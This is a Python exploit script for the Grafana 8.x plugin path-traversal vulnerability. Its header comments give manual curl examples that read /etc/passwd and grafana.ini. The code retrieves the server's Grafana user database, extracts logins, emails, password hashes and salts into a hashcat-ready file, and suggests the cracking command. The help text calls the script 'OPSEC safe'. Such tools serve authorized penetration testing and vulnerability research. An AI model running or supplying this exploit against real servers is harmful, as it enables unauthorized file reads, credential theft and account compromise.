#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2021, Tijl "Photubias" Deneut <tijl.deneut@howest.be>
# References:   https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/grafana/grafana-file-read.yaml
#               https://github.com/jas502n/Grafana-VulnTips
#
## Manual exploitation examples: 
##      curl -ik --path-as-is "http://192.168.1.100:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
##      curl -ik --path-as-is "http://192.168.1.100:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/grafana/grafana.ini"

import sys, urllib.request, ssl, sqlite3, base64, os, datetime
ssl._create_default_https_context = ssl._create_unverified_context

lstPlugins = {'alertlist', 'graph', 'elasticsearch', 'mysql', 'table'}
sTempFile = 'tempgrafanadb_{}.db'.format(datetime.datetime.now().strftime("%Y%m%d-%H%M%S"))
sHashFile = 'hashGrafana_{}.txt'.format(datetime.datetime.now().strftime("%Y%m%d-%H%M%S"))

def getDB(sBase):
    for sPlugin in lstPlugins:
        try: 
            oResponse = urllib.request.urlopen('{}public/plugins/{}/../../../../../../../../../../../../../../../../../../../etc/passwd'.format(sBase, sPlugin), timeout = 5)
            sPasswd = oResponse.read()
            ## If this works, we can go for the user DB
            oResponse = urllib.request.urlopen('{}public/plugins/{}/../../../../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db'.format(sBase, sPlugin), timeout = 5)
            bGrafanaDB = oResponse.read()
            open(sTempFile,'wb').write(bGrafanaDB)
            return bGrafanaDB
        except: continue

def parseDB(sGrafanaDB):
    oConn = sqlite3.connect(sGrafanaDB)
    oCur = oConn.cursor()
    oCur.execute('select login,email,password,salt from user')
    lstRows = oCur.fetchall()
    print('[+] Success, found {} users.'.format(len(lstRows)))
    oFile = open(sHashFile,'a')
    for lstUser in lstRows:
        print('    Login {} with email {}'.format(lstUser[0], lstUser[1]))
        sHash = lstUser[2]
        sSalt = lstUser[3]
        sLine = '{}:sha256:10000:{}:{}\n'.format(lstUser[0], base64.b64encode(sSalt.encode()).decode(), base64.b64encode(bytes.fromhex(sHash)).decode())
        oFile.write(sLine)
    oFile.close()

if __name__ == '__main__':
    if '-h' in sys.argv or len(sys.argv)<2:
        print(
        'usage: {} BaseURL\n'
        'E.g. {} http://192.168.1.100:3000/grafana\n\n'
        'OPSEC safe script to extract user hashes from a Grafana 8.x installation'.format(sys.argv[0], sys.argv[0]))
        sys.exit(0)

    sBase = sys.argv[1]
    if not sBase[-1] == '/': sBase += '/'
    print('[!] Verifying URL {}login'.format(sBase))

    oRequest = urllib.request.Request('{}login'.format(sBase))
    #oRequest.set_proxy('127.0.0.1:8080', 'http')
    try: oResponse = urllib.request.urlopen(oRequest, timeout = 5)
    except: sys.exit('[-] Error: {} is not responding'.format(sBase))

    bResponse = oResponse.read()
    if not b'buildInfo' in bResponse: sys.exit('[-] Error: {} is not a (recent) Grafana installation.'.format(sBase))
    print('[+] Grafana found, detecting version')

    try:
        bCurversion = bResponse.split(b'buildInfo":{')[1].split(b'}')[0].split(b'version":"')[1].split(b'"')[0]
        bLatestversion = bResponse.split(b'buildInfo":{')[1].split(b'}')[0].split(b'latestVersion":"')[1].split(b'"')[0]
        print('[+] Success, found version {} (newest version {})'.format(bCurversion.decode(), bLatestversion.decode()))
    except: 
        print('[-] Version not found, proceeding anyway')
    
    bGrafanaDB = getDB(sBase)
    parseDB(sTempFile)
    os.remove(sTempFile)
    print('\n[+] All done, saved {}'.format(sHashFile))
    print('      Next step: "hashcat -m 10900 {} wordlist.txt --username"'.format(sHashFile))
    